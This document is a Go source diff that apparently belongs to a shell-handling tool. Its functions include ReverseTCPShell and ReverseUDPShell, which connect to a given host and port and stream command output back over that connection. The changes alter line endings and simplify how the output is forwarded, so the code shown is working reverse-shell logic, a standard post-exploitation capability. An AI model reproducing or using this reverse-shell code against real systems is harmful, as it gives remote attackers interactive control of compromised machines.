@@ -38,13 +38,12 @@ func LocalShell(filepath string) {
 	for running == true {
 		//get input
 		msg := make([]byte, 500)
-		fmt.Printf("\n>>> ")
 		os.Stdin.Read(msg)
 		if strings.HasPrefix(string(msg), "exit") {
 			running = false
 		}
 		//now send the command
-		session.send(string(msg) + "\r\n")
+		session.send(string(msg) + "\n")
 		//collect output
 		timeout := 0
 		for timeout < 100 {
@@ -88,7 +87,7 @@ func DoCommand(filepath string, commands ...string) string {
 	output := bytes.Buffer{}
 	//input handling
 	for _,command := range commands {
-		session.send(command + "\r\n")
+		session.send(command + "\n")
 		timeout := 0
 		for timeout < 100 {
 			select {
@@ -139,7 +138,7 @@ func ReverseTCPShell(filepath string, host string, port int) {
 	//output goroutine
 	go func(session *shell, ch chan string) {
 		for {
-			ch <- session.recv()
+			target_conn.Write([]byte(session.recv()))
 		}
 	}(session,ch)
 	//input loop
@@ -152,18 +151,7 @@ func ReverseTCPShell(filepath string, host string, port int) {
 			running = false
 		}
 		//now send the command
-		session.send(string(msg) + "\r\n")
-		//collect output
-		timeout := 0
-		for timeout < 100 {
-			select {
-				case x := <-ch:
-					target_conn.Write([]byte(x))
-				default:
-					time.Sleep(10 * time.Millisecond)
-					timeout += 10
-			}
-		}
+		session.send(string(msg) + "\n")
 	}
 }
 
@@ -202,7 +190,7 @@ func ReverseUDPShell(filepath string, host string, port int) {
 	//output goroutine
 	go func(session *shell, ch chan string) {
 		for {
-			ch <- session.recv()
+			target_conn.Write([]byte(session.recv()))
 		}
 	}(session,ch)
 	//input loop
@@ -215,18 +203,7 @@ func ReverseUDPShell(filepath string, host string, port int) {
 			running = false
 		}
 		//now send the command
-		session.send(string(msg) + "\r\n")
-		//collect output
-		timeout := 0
-		for timeout < 100 {
-			select {
-				case x := <-ch:
-					target_conn.Write([]byte(x))
-				default:
-					time.Sleep(10 * time.Millisecond)
-					timeout += 10
-			}
-		}
+		session.send(string(msg) + "\n")
 	}
 }
 
